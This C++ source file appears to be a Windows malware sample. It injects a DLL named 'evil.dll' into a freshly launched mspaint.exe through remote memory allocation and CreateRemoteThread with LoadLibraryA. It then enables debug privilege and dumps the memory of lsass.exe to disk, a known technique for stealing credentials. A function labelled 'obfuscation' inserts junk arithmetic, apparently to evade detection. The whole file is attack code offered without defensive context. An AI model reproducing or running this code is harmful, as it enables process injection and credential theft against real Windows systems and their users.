#include <iostream>
#include <windows.h>
#include <stdio.h>
#include <math.h>
#include <string.h>
#include <tlhelp32.h>
#include <stdlib.h>
#include <dbghelp.h>

#pragma comment(lib, "ntdll")
#pragma comment(lib, "dbghelp.lib")

typedef NTSTATUS(NTAPI* pNtAllocateVirtualMmemory)(
    HANDLE           ProcessHandle,
    PVOID            *BaseAddress,
    ULONG            ZeroBits,
    PULONG           RegionSize,
    ULONG            AllocationType,
    ULONG            Protect
);

char maliciousLibraryPath[] = "evil.dll";
unsigned int maliciousLibraryPathLength = sizeof(maliciousLibraryPath) + 1;

// find a process and return its id
int locateTargetProcess(const char* targetProcName) {
    HANDLE hSnapshot;
    PROCESSENTRY32 processEntry;
    int pID = 0;
    BOOL hResult;

    // snapshot of all processes in the system
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hSnapshot) {
        return 0;
    }

    //initializing size: needed for using Process32First
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    // info about first process encountred in a system snapshot
    hResult = Process32First(hSnapshot, &processEntry);

    // retrieve information about the process
    // and exit if unsecussful
    size_t length = strlen(targetProcName) + 1;
    wchar_t wProcName[100];
    mbstowcs(wProcName, targetProcName, length);
    while (hResult) {
        // if we find the process: return process ID
        if (wcscmp(wProcName, processEntry.szExeFile) == 0) {
            pID = processEntry.th32ProcessID;
            break;
        }
        hResult = Process32Next(hSnapshot, &processEntry);
    }

    CloseHandle(hSnapshot);
    return pID;
}

// set privilege
BOOL enablePrivilege(LPCTSTR privilegeName) {
    HANDLE processToken;
    TOKEN_PRIVILEGES tokenPrivileges;
    LUID privilegeLUID;
    BOOL result = TRUE;

    if (!LookupPrivilegeValue(NULL, privilegeName, &privilegeLUID)) {
        result = FALSE;
    }
    tokenPrivileges.PrivilegeCount = 1;
    tokenPrivileges.Privileges[0].Luid = privilegeLUID;
    tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &processToken)) {
        result = FALSE;
    }
    if (!AdjustTokenPrivileges(processToken, FALSE, &tokenPrivileges, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {
        result = FALSE;
    }
    return result;
}

// create minidump of lsass.exe
BOOL generateMinDump() {
    bool dumpSuccess = FALSE;
    int processID = locateTargetProcess("lsass.exe");
    HANDLE processHandle = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, 0, processID);
    HANDLE outputHandle = CreateFile((LPCTSTR)"c:\\temp\\lsass.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (processHandle && outputHandle != INVALID_HANDLE_VALUE) {
        dumpSuccess = MiniDumpWriteDump(processHandle, processID, outputHandle, (MINIDUMP_TYPE)0x00000002, NULL, NULL, NULL);
    }
    return dumpSuccess;
}


// obfuscation
void MathOperations() {
    volatile int x = 0;
    x += 1;
    x -= 1;
    x *= 1;
    x /= 1;

    double y = 2.5;
    double z = 3.7;
    double result = 0.0;

    for (int i = 0; i < 3; i++) {
        result = sqrt(pow(y, 2) + pow(z, 2) + i);
        result = sin(result);
        result = cos(result);
        result = tan(result);
    }

    for (int i = 0; i < 10; ++i) {
        result *= i;
        result /= i;
        result += i;
    }

    if (result < 100) {
        result -= 100;
    } else{
        result += 100;
    }
}

int main(int argc, char* argv[]){
    HANDLE targetProcess; 
    HANDLE remoteThread;
    LPVOID remoteBuffer;

    // Obtain handles to kernel32 and ntdll and retrieve function pointer
    HMODULE ntdllHandle = GetModuleHandle(L"ntdll");
    HMODULE kernel32Handle = GetModuleHandle(L"Kernel32");
    VOID* loadLibraryFunction = (VOID*)GetProcAddress(kernel32Handle, "LoadLibraryA");

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(STARTUPINFOA));
    si.cb = sizeof(STARTUPINFOA);
    const char* process = "mspaint.exe";
    CreateProcessA(NULL, (LPSTR)process, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
    int pid = -1;
    pid = locateTargetProcess(process);

    MathOperations();
    
    // Parse process ID
    if (pid <= 0) {
        return -1;
    }
    targetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pid);
    
    pNtAllocateVirtualMmemory myNtAllocateVirtualMemory = (pNtAllocateVirtualMmemory)GetProcAddress(ntdllHandle, "NtAllocateVirtualMemory");

    // Allocate memory buffer in the remote process
    myNtAllocateVirtualMemory(targetProcess, &remoteBuffer, 0, (PULONG)&maliciousLibraryPathLength, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // Copy the malicious DLL path to the remote process
    WriteProcessMemory(targetProcess, remoteBuffer, maliciousLibraryPath, maliciousLibraryPathLength, NULL);

    // Start a new thread in the target process
    remoteThread = CreateRemoteThread(targetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryFunction, remoteBuffer, 0, NULL);
    CloseHandle(targetProcess);

    MathOperations();

    if (!enablePrivilege(SE_DEBUG_NAME)) {
        return -1;
    }
    if (!generateMinDump()) {
        return -1;
    }
    return 0;

}

